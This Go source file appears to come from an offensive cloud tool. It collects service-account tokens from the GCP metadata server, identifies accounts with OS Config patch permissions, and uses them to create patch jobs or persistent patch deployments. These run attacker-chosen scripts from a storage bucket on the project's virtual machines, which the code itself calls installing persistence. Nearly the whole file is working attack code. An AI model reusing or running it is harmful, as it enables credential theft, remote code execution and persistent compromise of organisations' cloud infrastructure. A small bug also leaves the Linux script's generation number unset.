package engine

import (
	"bufio"
	"bytes"
	"context"
	_ "embed"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	asset "cloud.google.com/go/asset/apiv1"
	"cloud.google.com/go/compute/metadata"
	"cloud.google.com/go/storage"
	tokenWrapper "github.com/rek7/patchy/pkg/token_wrapper"
	"golang.org/x/oauth2"
	"google.golang.org/api/iam/v1"
	"google.golang.org/api/iterator"
	"google.golang.org/api/option"
	"google.golang.org/api/osconfig/v1"
	assetpb "google.golang.org/genproto/googleapis/cloud/asset/v1"
)

//go:embed patches/patch_deployment.json
var patchDeployment string

//go:embed patches/patch_job.json
var patchJob string

type Engine struct {
	projectName string
	// for persistent jobs
	patch_deployment *osconfig.PatchDeployment
	// only runs once
	patch_job     *osconfig.ExecutePatchJobRequest
	isPersistence bool
	ctx           context.Context
	mcli          *metadata.Client
	// these need to be exported for templating library
	PatchName         string
	BucketName        string
	WindowsScriptName string
	LinuxScriptName   string
	PatchDescription  string
}

func NewEngine(bucketName, patchName, patchDesc, winScript, linScript string, isPersistence bool, ctx context.Context) (*Engine, error) {
	e := Engine{
		PatchName:         patchName,
		PatchDescription:  patchDesc,
		ctx:               ctx,
		patch_deployment:  &osconfig.PatchDeployment{},
		patch_job:         &osconfig.ExecutePatchJobRequest{},
		isPersistence:     isPersistence,
		BucketName:        bucketName,
		WindowsScriptName: winScript,
		LinuxScriptName:   linScript,
		mcli:              metadata.NewClient(&http.Client{Timeout: time.Second}),
	}

	if err := e.fillOutPatches(); err != nil {
		return nil, err
	}

	return &e, nil
}

// finish templating info
func (e *Engine) fillOutPatches() error {
	// gotta get generation number for payloads
	getGenerationNumber := func(objName string) (int64, error) {
		client, err := storage.NewClient(e.ctx)
		if err != nil {
			return 0, err
		}

		bucketInfo := client.Bucket(e.BucketName)
		bucketAttrs, err := bucketInfo.Object(objName).Attrs(e.ctx)
		if err != nil {
			return 0, err
		}
		return bucketAttrs.Generation, nil
	}

	fillOut := func(rawContent string) ([]byte, error) {
		tmpl, err := template.New("patch").Parse(rawContent)
		if err != nil {
			return nil, err
		}

		var buf bytes.Buffer
		err = tmpl.Execute(&buf, e)
		if err != nil {
			return nil, err
		}
		return buf.Bytes(), nil
	}

	if e.isPersistence {
		patch, err := fillOut(patchDeployment)
		if err != nil {
			return err
		}

		if err := json.Unmarshal(patch, e.patch_deployment); err != nil {
			return err
		}

		windowsGen, err := getGenerationNumber(e.patch_deployment.PatchConfig.PreStep.WindowsExecStepConfig.GcsObject.Object)
		if err != nil {
			return err
		}

		linuxGen, err := getGenerationNumber(e.patch_deployment.PatchConfig.PreStep.LinuxExecStepConfig.GcsObject.Object)
		if err != nil {
			return err
		}

		e.patch_deployment.PatchConfig.PreStep.WindowsExecStepConfig.GcsObject.GenerationNumber = linuxGen
		e.patch_deployment.PatchConfig.PreStep.WindowsExecStepConfig.GcsObject.GenerationNumber = windowsGen

	} else {
		patch, err := fillOut(patchJob)
		if err != nil {
			return err
		}

		if err := json.Unmarshal(patch, e.patch_job); err != nil {
			return err
		}

		windowsGen, err := getGenerationNumber(e.patch_job.PatchConfig.PreStep.WindowsExecStepConfig.GcsObject.Object)
		if err != nil {
			return err
		}

		linuxGen, err := getGenerationNumber(e.patch_job.PatchConfig.PreStep.LinuxExecStepConfig.GcsObject.Object)
		if err != nil {
			return err
		}

		e.patch_job.PatchConfig.PreStep.WindowsExecStepConfig.GcsObject.GenerationNumber = linuxGen
		e.patch_job.PatchConfig.PreStep.WindowsExecStepConfig.GcsObject.GenerationNumber = windowsGen
	}
	return nil
}

func (e *Engine) gatherAllServiceAccountTokens() (map[string]*oauth2.Token, error) {
	serviceAccountsTokens := make(map[string]*oauth2.Token, 0)
	serviceAccountNames, err := e.mcli.Get("/instance/service-accounts/")
	if err != nil {
		return serviceAccountsTokens, err
	}

	scanner := bufio.NewScanner(strings.NewReader(serviceAccountNames))
	for scanner.Scan() {
		if len(fmt.Sprintf("%q", scanner.Text())) == 0 {
			continue
		}
		serviceAccountTokenJSON, err := e.mcli.Get(filepath.Join("/instance/service-accounts/"+scanner.Text(), "token"))
		if err != nil {
			return serviceAccountsTokens, err
		}

		tokenInfo := &oauth2.Token{}

		if err := json.Unmarshal([]byte(serviceAccountTokenJSON), &tokenInfo); err != nil {
			return serviceAccountsTokens, err
		}

		serviceAccountEmail, err := e.mcli.Get(filepath.Join("/instance/service-accounts/"+scanner.Text(), "email"))
		if err != nil {
			return serviceAccountsTokens, err
		}
		serviceAccountsTokens[serviceAccountEmail] = tokenInfo
	}

	return serviceAccountsTokens, nil
}

// see if we can query GCP metadata API and get project name
func (e *Engine) isWithinGCP() bool {
	projName, err := e.mcli.ProjectID()
	if err != nil {
		return false
	}

	e.projectName = projName

	return true
}

// used to make authenticated calls with an access token
func (e *Engine) getTokenSource(token *oauth2.Token) option.ClientOption {
	// kinda hacky lol
	t := tokenWrapper.NewAccessToken(token)
	return option.WithTokenSource(t)
}

func (e *Engine) exploitServiceAccountAccessToken(serviceAccount string, token *oauth2.Token) (bool, error) {
	osconfigService, err := osconfig.NewService(e.ctx, e.getTokenSource(token))
	if err != nil {
		// this is simply an issue with no valid creds continue to next account
		if strings.Contains(err.Error(), "403") {
			return false, nil
		}
		return false, err
	}

	if err := e.performPersistence(osconfigService); err != nil {
		return false, err
	}

	return true, nil
}

func (e *Engine) ExploitServiceAccountCredFile(filename string) error {
	osconfigService, err := osconfig.NewService(e.ctx, option.WithCredentialsFile(filename))
	if err != nil {
		return err
	}

	if err := e.performPersistence(osconfigService); err != nil {
		return err
	}

	content, err := os.ReadFile(filename)
	if err != nil {
		return err
	}

	serviceAccountInfo := struct {
		Email string `json:"client_email"`
	}{}

	if err := json.Unmarshal(content, &serviceAccountInfo); err != nil {
		return err
	}

	log.Printf("Successfully installed persistence using account: %v", serviceAccountInfo.Email)
	return nil
}

func (e *Engine) performPersistence(osconfigService *osconfig.Service) error {
	// create patch deployment
	if e.isPersistence {
		call := osconfigService.Projects.PatchDeployments.Create("projects/"+e.projectName, e.patch_deployment)

		deployment, err := call.PatchDeploymentId(e.PatchName).Do()
		if err != nil {
			return err
		}

		if deployment.HTTPStatusCode != 200 {
			return fmt.Errorf("not ok status code: %v", deployment.HTTPStatusCode)
		}
		// create patch job
	} else {
		job, err := osconfigService.Projects.PatchJobs.Execute("projects/"+e.projectName, e.patch_job).Do()
		if err != nil {
			return err
		}

		if job.HTTPStatusCode != 200 {
			return fmt.Errorf("not ok status code: %v", job.HTTPStatusCode)
		}
	}

	return nil
}

func (e *Engine) FindMisconfigurations(isExploit bool) error {
	// both fills out project and checks if we're in a gcp env
	if !e.isWithinGCP() {
		return fmt.Errorf("not within a GCP environment")
	}

	serviceAccountTokens, err := e.gatherAllServiceAccountTokens()
	if err != nil {
		return err
	}

	vulnAccounts := make(map[string][]*struct {
		role string
		perm string
	})

	for serviceAccount, token := range serviceAccountTokens {
		log.Printf("trying service account %v", serviceAccount)
		if isExploit {
			isSuccess, err := e.exploitServiceAccountAccessToken(serviceAccount, token)
			if err != nil {
				return err
			}

			if isSuccess {
				log.Println("Successfully performed OS patching using account", serviceAccount)
				vulnAccounts[serviceAccount] = append(vulnAccounts[serviceAccount], nil)
				break
			}
		} else {
			// gcloud translation:  gcloud asset search-all-iam-policies --scope=projects/<project name> --query="policy:<serviceccount@google.com"
			t := &assetpb.SearchAllIamPoliciesRequest{}
			t.Query = "policy:" + serviceAccount
			// some reason i cant get project name in cloud shell :(
			t.Scope = "projects/" + e.projectName

			client, err := asset.NewClient(e.ctx, e.getTokenSource(token))
			if err != nil {
				return err
			}
			defer client.Close()

			iamService, err := iam.NewService(e.ctx, e.getTokenSource(token))
			if err != nil {
				return err
			}

			iter := client.SearchAllIamPolicies(e.ctx, t)
			for {
				info, err := iter.Next()
				if err != nil {
					if err == iterator.Done {
						break
					}
					return err
				}
				// basically we're running: gcloud --log-http iam roles describe roles/<role>
				for _, binding := range info.Policy.Bindings {
					role := binding.Role
					perms, err := iam.NewProjectsRolesService(iamService).Get(role).Do()
					if err != nil {
						return err
					}

					for _, perm := range perms.IncludedPermissions {
						// has perms for either patchjob or patchdeployment, mark as vuln
						if perm == "osconfig.patchJobs.exec" || perm == "osconfig.patchDeployments.create" {
							vulnAccounts[serviceAccount] = append(vulnAccounts[serviceAccount], &struct {
								role string
								perm string
							}{
								role: role,
								perm: perm,
							})
							log.Printf("service account %v is exploitable has permissions %v on role %v", serviceAccount, perm, role)
						}
					}
				}
			}
		}
		// we have some vuln accounts here
		if len(vulnAccounts) > 0 {
			log.Printf("found %v exploitable service accounts", len(vulnAccounts))
			return nil
		}
	}
	log.Println("No valid service accounts or accounts are under privileged")
	return nil
}
